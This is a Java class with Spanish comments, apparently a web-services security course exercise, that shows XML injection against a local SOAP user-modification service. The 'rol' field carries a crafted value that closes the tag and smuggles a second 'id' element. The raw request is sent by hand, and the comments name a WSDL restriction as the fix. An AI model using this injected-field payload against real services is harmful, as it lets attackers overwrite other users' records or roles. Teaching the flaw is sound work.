import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

import javax.net.ssl.HttpsURLConnection;

public class Prueba_Inyeccion {

	/*
	 * En este ejemplo vamos a inyectar XML a nuestra petición, como las clases
	 * proxy que se generan hacen un saneamiento de la entrada, vamos a 
	 * usar una librería de más bajo nivel para hacer la peticion HTTP
	 */
	public static void main(String[] args) throws Exception {
		
		//Este sería un ejemplo de la petición anterior si capturaramos
		//el mensaje http al enviarlo al servidor
		/*
		POST /Ej02_InyeccionXML_CXF/services/ServicioUsuarios HTTP/1.0
		Content-Type: text/xml; charset=utf-8
		Accept: application/soap+xml, application/dime, multipart/related, text/*
		User-Agent: Axis/1.4
		Host: localhost:8081
		Cache-Control: no-cache
		Pragma: no-cache
		SOAPAction: ""
		Content-Length: 613
		
		<?xml version="1.0" encoding="UTF-8"?>
		<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
		<soapenv:Body>
		<modificarUsuario xmlns="http://servicio.modelo.curso.com">
		<usuario>
			<ns1:id xmlns:ns1="http://entidad.modelo.curso.com">1</ns1:id>
			<ns2:login xmlns:ns2="http://entidad.modelo.curso.com">L</ns2:login>
			<ns3:pw xmlns:ns3="http://entidad.modelo.curso.com">PW</ns3:pw>
			<ns4:rol xmlns:ns4="http://entidad.modelo.curso.com"></ns4:rol>
			<ns1:id xmlns:ns1="http://entidad.modelo.curso.com">123456</ns1:id>
			<ns4:rol xmlns:ns4="http://entidad.modelo.curso.com">1</ns4:rol>
		</usuario>
		</modificarUsuario>
		</soapenv:Body>
		</soapenv:Envelope>
		*/
		
		//En este ejemplo en vez de usar el objeto proxy para conectarnos al webservice
		//vamos a hacer una conexión lo más pura posible, creando el mensaje HTTP 
		//que tenemos arriba
		//Para ello vamos a suar el objeto HttpUrlConnection y rellenarlo
		//con todas las propiedades
		String url = "http://localhost:8080/Ej02_InyeccionXML_CXF/services/ServicioUsuariosPort";
		
		URL obj = new URL(url);
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
 
		//Configuración de la cabecera de la petición
		con.setRequestMethod("POST");
		
		con.setRequestProperty("Content-Type", "text/xml; charset=utf-8");
		con.setRequestProperty("Accept", "application/soap+xml, application/dime, multipart/related, text/*");
		con.setRequestProperty("User-Agent", "Axis/1.4");
		con.setRequestProperty("Host", "localhost:8081");
		con.setRequestProperty("Cache-Control", "no-cache");
		con.setRequestProperty("Pragma", "no-cache");
		con.setRequestProperty("SOAPAction", "\"\"");
		con.setRequestProperty("Content-Length", "613");		
		
		//Cambiamos el id introducido inicialmente inyectando 
		//en el campo que recoge el rol del usuario otra etiqueta xml
		//con el id nuevo
		//lo normal seria que un usuario normal nos ponga un '1'
		//String rol = "1";
		//Pero un usuario que nos puedan inyectar haria esto otro
		String rol = "1</rol>" + "<id>123456</id>" + "<rol>1";
		
		String urlParameters = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"+
			"<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">"+
				"<soapenv:Body>"+
					"<modificarUsuario xmlns=\"http://servicio.modelo.curso.com/\">"+
						"<arg0 xmlns=\"\">"+
							"<id>1</id>"+
							"<login>L</login>"+
							"<pw>PW</pw>"+
							//Aqui esta la clave de la inyeccion, en este caso vamos a add
							//al rol que le vamos a pasar el rol declarado arriba, por lo que vamos a 
							//generar mas etiquetas xml de las que deberiamos, y el mensaje
							//HTML resultante será el que tenemos al principio de la clase
							//El objetivo final será que el servidor se quedará con el 
							//ultimo valor del rol, por lo que nos habran inyectado el xml	
							//La solución vendria por cambiar el wsdl generado y restingir el max
							//numero de elementos id y rol, por ejemplo
							"<rol>"+rol+"</rol>"+
						"</arg0>"+
					"</modificarUsuario>"+
				"</soapenv:Body>"+
			"</soapenv:Envelope>";		

		//Enviamos la petición
		con.setDoOutput(true);
		DataOutputStream wr = new DataOutputStream(con.getOutputStream());
		wr.writeBytes(urlParameters);
		wr.flush();
		wr.close();
 
		int responseCode = con.getResponseCode();
		System.out.println("\nSending 'POST' request to URL : " + url);
		System.out.println("Post parameters : " + urlParameters);
		System.out.println("Response Code : " + responseCode);
 
		BufferedReader in = new BufferedReader(
		        new InputStreamReader(con.getInputStream()));
		String inputLine;
		StringBuffer response = new StringBuffer();
 
		while ((inputLine = in.readLine()) != null) {
			response.append(inputLine);
		}
		in.close();
 
		//print result
		System.out.println(response.toString());
 		
		
	}
	
}
